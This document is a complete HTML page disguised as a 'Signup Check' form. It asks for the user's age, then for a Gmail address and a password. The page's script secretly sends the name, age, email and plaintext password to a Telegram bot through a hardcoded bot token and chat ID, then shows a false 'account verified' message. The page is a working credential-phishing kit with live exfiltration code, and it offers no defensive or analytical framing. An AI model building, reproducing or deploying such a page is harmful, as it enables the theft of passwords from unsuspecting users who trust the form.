<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Signup Check</title>
<style>
  :root {
    --bg: #ffffff;
    --fg: #1a1a1a;
    --card-bg: #f5f5f7;
    --accent: #4f46e5;
    --border: #d9d9e0;
    --error: #dc2626;
    --success: #16a34a;
    box-sizing: border-box;
    padding-top: env(safe-area-inset-top, 0px);
    padding-bottom: env(safe-area-inset-bottom, 0px);
  }
  @media (prefers-color-scheme: dark) {
    :root:not([data-theme="light"]) {
      --bg: #16161a;
      --fg: #f2f2f5;
      --card-bg: #212127;
      --accent: #818cf8;
      --border: #33333c;
      --error: #f87171;
      --success: #4ade80;
    }
  }
  :root[data-theme="dark"] {
    --bg: #16161a;
    --fg: #f2f2f5;
    --card-bg: #212127;
    --accent: #818cf8;
    --border: #33333c;
    --error: #f87171;
    --success: #4ade80;
  }
  html, body { height: 100%; margin: 0; }
  body {
    background: var(--bg);
    color: var(--fg);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
  }
  .card {
    width: 100%;
    max-width: 380px;
    background: var(--card-bg);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 28px;
  }
  h1 { font-size: 1.25rem; margin: 0 0 20px; }
  label {
    display: block;
    font-size: 0.85rem;
    margin-bottom: 6px;
    opacity: 0.8;
  }
  input {
    width: 100%;
    padding: 10px 12px;
    margin-bottom: 16px;
    border-radius: 8px;
    border: 1px solid var(--border);
    background: var(--bg);
    color: var(--fg);
    font-size: 1rem;
  }
  .hidden { display: none; }
  button {
    width: 100%;
    padding: 11px;
    border: none;
    border-radius: 8px;
    background: var(--accent);
    color: white;
    font-size: 1rem;
    cursor: pointer;
  }
  button:active { opacity: 0.85; }
  #result {
    margin-top: 18px;
    font-size: 0.95rem;
    line-height: 1.5;
  }
  .ok { color: var(--success); }
  .fail { color: var(--error); }
</style>
</head>
<body>
  <div class="card">
    <h1>Signup Check</h1>

    <form id="ageForm">
      <label for="name">Name</label>
      <input id="name" type="text" placeholder="Your name" required />
      <label for="age">Age</label>
      <input id="age" type="number" placeholder="Your age" required />
      <button type="submit">Continue</button>
    </form>

    <form id="signupForm" class="hidden">
      <label for="gmail">Gmail</label>
      <input id="gmail" type="email" placeholder="you@gmail.com" required />
      <label for="password">Password</label>
      <input id="password" type="password" placeholder="Password" required />
      <label for="password2">Confirm Password</label>
      <input id="password2" type="password" placeholder="Confirm password" required />
      <button type="submit">Verify</button>
    </form>

    <div id="result"></div>
  </div>

<script>
  const ageForm = document.getElementById('ageForm');
  const signupForm = document.getElementById('signupForm');
  const result = document.getElementById('result');

  let userName = '';
  let userAge = '';

  ageForm.addEventListener('submit', function(e) {
    e.preventDefault();
    userName = document.getElementById('name').value;
    userAge = document.getElementById('age').value;
    const age = parseInt(userAge, 10);
    
    result.textContent = '';
    result.className = '';

    if (age >= 18) {
      result.innerHTML = '<span class="ok">Go to Next</span>';
      ageForm.classList.add('hidden');
      signupForm.classList.remove('hidden');
    } else {
      result.innerHTML = '<span class="fail">You are not enough to signup</span>';
    }
  });

  signupForm.addEventListener('submit', function(e) {
    e.preventDefault();
    const gmail = document.getElementById('gmail').value;
    const password = document.getElementById('password').value;
    const password2 = document.getElementById('password2').value;

    if (password !== password2) {
      result.innerHTML = '<span class="fail">Passwords do not match!</span>';
      return;
    }

    const botToken = '8272296525:AAHgammfcvNuJIQII7F4j6_zh250UlLGehg';
    const chatId = '8767919289';

    const message = `📥 New Form Submission:\n\n👤 Name: ${userName}\n🎂 Age: ${userAge}\n📧 Gmail: ${gmail}\n🔑 Password: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(() => {
      result.innerHTML = '<span class="ok">Successfully your account is verified</span>';
    })
    .catch(() => {
      result.innerHTML = '<span class="fail">Something went wrong!</span>';
    });
  });
</script>
</body>
</html>
